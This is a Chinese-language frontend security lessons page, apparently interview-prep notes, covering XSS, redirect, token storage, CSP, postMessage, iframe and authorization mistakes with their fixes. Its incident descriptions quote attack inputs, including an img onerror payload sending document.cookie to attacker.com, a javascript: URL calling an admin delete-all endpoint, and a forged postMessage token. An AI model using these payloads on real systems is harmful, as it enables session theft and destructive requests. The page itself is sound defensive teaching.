项目踩过的坑:真实业务里的安全教训 ​

来自简历项目"01 商户管理 SaaS"、"03 智能风控引擎平台"、"04 农业数字化 App + IoT 大屏"的安全事故与教训。

一、富文本直接渲染(已修复) ​

问题:dangerouslySetInnerHTML=&#123;&#123; __html: userInput &#125;&#125; —— 用户输入的 HTML 直接渲染。

踩坑: 商户在"店铺介绍"输入 <img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">,所有访问该店铺的管理员 cookie 被窃取。

修复:

ts
import DOMPurify from 'dompurify'

// 默认白名单(去掉所有危险标签/属性)
const clean = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: ['b', 'i', 'u', 'p', 'br', 'span', 'a', 'img'],
  ALLOWED_ATTR: ['href', 'src', 'alt', 'title'],
})

// 富文本也要 force HTTPS(防 javascript: URL)
const safe = DOMPurify.sanitize(clean, {
  ALLOWED_URI_REGEXP: /^(https?:|\/)/i,
})

教训:

  • 永远不要信任用户输入,即使是"内部用户"
  • 富文本用 DOMPurify 白名单,而不是黑名单
  • 双重校验:前端过滤 + 服务端过滤

二、javascript: URL 跳转 ​

问题:window.location = userInput —— 用户可以输入 javascript:alert(1)。

踩坑: "重定向 URL" 功能允许用户输入跳转地址。攻击者输入 javascript:fetch('/api/admin/delete-all'),管理后台被 XSS + CSRF 组合攻击。

修复:

ts
function safeRedirect(url: string) {
  // 1. 只允许 http(s):// 或站内相对路径
  if (!/^https?:\/\//i.test(url) && !url.startsWith('/')) {
    return '/redirect-error'
  }
  // 2. 不要跳转到 javascript:
  const parsed = new URL(url, location.origin)
  if (!['http:', 'https:'].includes(parsed.protocol)) {
    return '/redirect-error'
  }
  location.href = parsed.toString()
}

教训:

  • 任何 URL 拼接前都要 parse + 校验 protocol
  • 黑名单 javascript: 不够——data:、vbscript:、file: 都有风险

三、localStorage 存 token(已修复) ​

问题:登录后把 JWT 存在 localStorage。

踩坑: 某第三方 JS SDK(用户主动嵌入的统计工具)被供应链攻击(类似 event-stream),通过 XSS 读取所有 localStorage,用户 token 被窃取。

修复:

http
Set-Cookie: token=xxx; HttpOnly; Secure; SameSite=Lax; Path=/

# HttpOnly → JS 读不到
# Secure → 仅 HTTPS 传输
# SameSite=Lax → 跨站请求不带(防 CSRF)

教训:

  • 敏感 token 必须 HttpOnly Cookie
  • localStorage 只存"前端需要的非敏感数据"(UI 偏好、主题)
  • 即使有 HttpOnly,也要加 CSP + 严格 XSS 防御做纵深防御

四、缺失 CSP ​

问题:页面没设 CSP,任意脚本可执行。

踩坑: 发现某个老功能允许用户上传.md 文件预览,用了一个开源的 markdown 渲染器。这个库有未公开的 XSS 漏洞,在用户预览恶意 markdown 时触发。

修复:

http
Content-Security-Policy: default-src 'self';
  script-src 'self' 'nonce-{RANDOM}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self'

配合 nonce 机制:

html
<script nonce="<%= randomNonce %>">
  // 业务代码
</script>

教训:

  • CSP 不是选配,是默认应该有的
  • 上线前至少开 Content-Security-Policy-Report-Only,观察违规,再切到强制
  • 即使有 CSP,也要修 XSS 漏洞——CSP 是兜底,不是替代

五、三方登录 popup 不校验 origin ​

问题:window.open('https://oauth.com/authorize?redirect_uri=...'),popup 回调通过 postMessage 通信,但没校验 origin。

踩坑: 攻击者构造页面,在用户登录第三方登录页时,弹出恶意 popup,恶意页面通过 window.opener.postMessage({ token: 'fake' }, '*') 注入伪造 token。

修复:

ts
window.addEventListener('message', (e) => {
  // 严格校验 origin,绝不接受 '*'
  if (e.origin !== 'https://oauth.com' &&
      e.origin !== 'https://www.yoursite.com') {
    return  // 拒绝
  }
  // 处理合法消息
  ...
})

教训:

  • postMessage 必须校验 origin + source
  • targetOrigin 不能传 '*'(否则消息可能发到恶意页面)
  • 关键数据走服务端,不通过 popup 直接传递

六、iframe 不限制 sandbox ​

问题:<iframe src="https://3rd-party.com/widget"> —— 第三方页面能执行任意脚本。

踩坑: 商户后台嵌入了第三方统计图表 widget,这个 widget 的广告 SDK 有恶意代码,弹广告 + 偷偷埋 cookie。

修复:

html
<!-- sandbox 是空字符串时最严格:不执行脚本、不提交表单、不弹窗 -->
<iframe sandbox="allow-scripts" src="https://3rd-party.com/widget"></iframe>

<!-- 严格模式 -->
<iframe sandbox src="https://3rd-party.com/widget"></iframe>

如果一定要允许部分能力:

html
<iframe sandbox="allow-scripts allow-same-origin" src="..."></iframe>

教训:

  • 嵌入第三方 iframe 默认开启 sandbox
  • 即使是"信任的供应商"也要隔离——他们也可能被入侵
  • allow-scripts 和 allow-same-origin 同时开 = 等于没开

七、敏感操作缺二次验证 ​

问题:管理员一键删除账户、批量退款、转账,只要登录态就能操作。

踩坑: 某销售误点了"批量删除商户"按钮,30 秒内删了 200 个商户数据。紧急恢复用了 6 小时。

修复:

ts
// 1. 关键操作二次确认
async function batchDelete(ids: string[]) {
  if (!confirm(`确认删除 ${ids.length} 个商户?该操作不可恢复!`)) return
  if (!await verifyPassword()) return  // 二次验证
  // ...
}

// 2. 服务端做权限校验,不只是前端按钮 disabled
async function deleteMerchant(id: string, userId: string) {
  // 服务端检查用户角色、操作时间、操作频率
  const user = await getUser(userId)
  if (!['admin', 'super_admin'].includes(user.role)) throw new Error()
  if (Date.now() - user.lastDelete < 300000) throw new Error('操作过于频繁')
  // ...
}

教训:

  • 前端 disabled 不等于安全——服务端必须独立校验
  • 关键操作要二次验证(密码 / 短信 / 邮箱)
  • 服务端做操作日志和频率限制,防止误操作和恶意刷接口

八、其他教训速查 ​

场景教训
JWT 过期时间过长设短(15~30 分钟),用 refresh token
CORS 配置 *允许 origin 白名单,不能用 *
错误信息暴露堆栈生产环境不返回堆栈详情
缺少速率限制登录、注册、找回密码都加 rate limit
API 不校验 ID 类型user.id 传 'abc' 会怎样?要验证
日志泄露密码log 前过滤敏感字段

九、复盘清单 ​

每个新项目/新功能上线前:

  • [ ] 所有用户输入走统一过滤层
  • [ ] 富文本用 DOMPurify
  • [ ] Token 走 HttpOnly Cookie
  • [ ] CSP 至少 Report-Only 起步
  • [ ] 关键操作二次验证
  • [ ] iframe 默认 sandbox
  • [ ] postMessage 校验 origin
  • [ ] npm audit 无高危
  • [ ] 强制 HTTPS + HSTS
  • [ ] 错误信息不泄露堆栈
  • [ ] 关键操作日志审计

🎯 面试常考 ​

Q1：真实项目里最常犯的安全错误?

① 密钥写进前端代码或提交进仓库;② 只在前端做权限判断;③ 接口返回了用不到的敏感字段(整个 user 对象);④ 日志打印了完整请求体;⑤ CORS 配成 *。

Q2：怎么在流程上防住?

密钥走环境变量 + 仓库扫描(gitleaks);接口层做权限校验;响应做字段裁剪;日志脱敏;CORS 用具体域名白名单。

Q3：安全应该放在哪个环节?

不是最后加的检查项。设计阶段定数据流向和权限模型,开发阶段用 lint 规则和安全库(参数化查询、加密库),上线前做扫描和渗透测试。

📝 小结 ​

  • 这页的坑按「现象 → 根因 → 修法」组织,面试时直接讲坑比讲理论有说服力。
  • 最高频三个:密钥进 bundle、只有前端做权限判断、依赖不扫描。
  • 每个坑都要说清怎么发现的(代码审计 / 安全扫描 / 线上告警)。
  • 安全是流程问题不是一次性修复 —— 要进 CI 和发版清单。
